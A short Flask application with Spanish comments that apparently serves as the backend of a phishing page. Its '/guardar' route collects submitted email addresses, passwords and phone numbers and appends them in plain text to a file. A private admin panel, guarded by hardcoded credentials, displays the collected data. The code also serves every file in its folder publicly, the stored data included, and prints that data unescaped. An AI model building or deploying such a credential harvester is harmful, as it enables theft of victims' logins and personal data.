from flask import Flask, request, session, redirect, send_from_directory
import os

# Configuramos la app para que busque archivos en la carpeta actual (.)
app = Flask(__name__, static_folder='.', static_url_path='')
app.secret_key = 'clave_super_secreta_2026'

# 1. PÁGINA PRINCIPAL (Pública)
@app.route('/')
def index():
    return send_from_directory('.', 'index.html')

# 2. RUTA PARA ARCHIVOS (CSS, imágenes, JS)
@app.route('/<path:path>')
def static_files(path):
    return send_from_directory('.', path)

# 3. PROCESAR DATOS (Recibe los datos del formulario)
@app.route('/guardar', methods=['POST'])
def guardar():
    c = request.form.get('correo')
    p = request.form.get('password')
    t = request.form.get('telefono')
    with open('datos.txt', 'a') as f:
        f.write(f"{c}|{p}|{t}\n")
    return "Datos recibidos correctamente. <a href='/'>Volver</a>"

# 4. PANEL PRIVADO (Protegido por login)
@app.route('/panel', methods=['GET', 'POST'])
def panel():
    # Si ya iniciaste sesión, muestras los datos
    if session.get('logged_in'):
        try:
            with open('datos.txt', 'r') as f:
                datos = f.read()
            return f"<h1>Panel de Datos</h1><pre>{datos}</pre><br><a href='/logout'>Cerrar Sesión</a>"
        except FileNotFoundError:
            return "No hay datos aún."

    # Login para entrar al panel
    if request.method == 'POST':
        if request.form.get('usuario') == 'juanc._25' and request.form.get('pass') == 'elprofre':
            session['logged_in'] = True
            return redirect('/panel')
        else:
            return "Credenciales incorrectas. <a href='/panel'>Volver</a>"

    return '''
    <div style="text-align:center; margin-top:50px;">
        <h3>Login de Administrador</h3>
        <form method="post">
            Usuario: <input type="text" name="usuario"><br><br>
            Contraseña: <input type="password" name="pass"><br><br>
            <input type="submit" value="Entrar">
        </form>
    </div>
    '''

@app.route('/logout')
def logout():
    session.clear()
    return redirect('/panel')

if __name__ == '__main__':
    app.run()

